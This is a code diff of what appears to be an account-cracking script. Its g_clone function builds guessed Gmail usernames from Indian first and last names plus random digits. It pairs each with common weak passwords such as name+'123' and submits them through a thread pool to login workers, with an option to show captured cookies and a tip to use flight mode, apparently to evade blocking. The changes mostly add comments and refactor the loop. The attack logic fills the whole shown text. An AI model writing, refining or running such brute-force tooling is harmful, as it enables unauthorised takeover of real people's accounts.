@@ -936,12 +936,14 @@ def g_clone():
     print(logo)
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
     domain = '@gmail.com'
+
+    # Handle user input for Crack Limit
     try:
         limit = int(input(' [:] Crack Limit : '))
     except ValueError:
         limit = 5000  # Default value if input is invalid
     
-    # Generate user data (3-digit random numbers)
+    # Generate random user data (3-digit random numbers)
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(3))
         user.append(nmp)
@@ -961,9 +963,11 @@ def g_clone():
     SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
     
+    # Ask if cookies should be shown
     print(" [?] Do You Want To Show Cookies : (Y/N) ")
     linex()
     c = input(" [?] Input : ")
+    cookie_show = []
     if c in ["Y", "y"]:
         cookie_show.append("yes")
     else:
@@ -979,15 +983,23 @@ def g_clone():
         print(f'{green}=> USE FLIGHT MODE ')
         print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
         
-        # Use zip_longest to iterate over user, first, and last
-        from itertools import zip_longest
+        # Define lists for first and last names
         first = ['sumon', 'abinash', 'rakesh', 'riya', 'ramesh', 'somnath']
         last = ['roy', 'das', 'sarkar', 'mondal']
-        for love, firs, las in zip_longest(user, first, last):
+        
+        # Manually iterate through the user, first, and last lists
+        max_len = max(len(user), len(first), len(last))  # Determine the maximum length
+        for i in range(max_len):
+            # Safely access each list element with a fallback to '' if index out of range
+            love = user[i] if i < len(user) else '00'
+            firs = first[i] if i < len(first) else '00'
+            las = last[i] if i < len(last) else '00'
+            
+            # Concatenate values to create the uid
             uid = firs + las + love + domain
             pwx = [firs + las, firs + '12', firs + '123', firs + '1234', firs + '12345']
             
-            # Submit tasks to thread pool based on chosen method
+            # Submit tasks to the thread pool based on chosen method
             if SUMONfire == '1':
                 SUMON_xd.submit(mbasic, uid, pwx, tl)
             elif SUMONfire == '2':
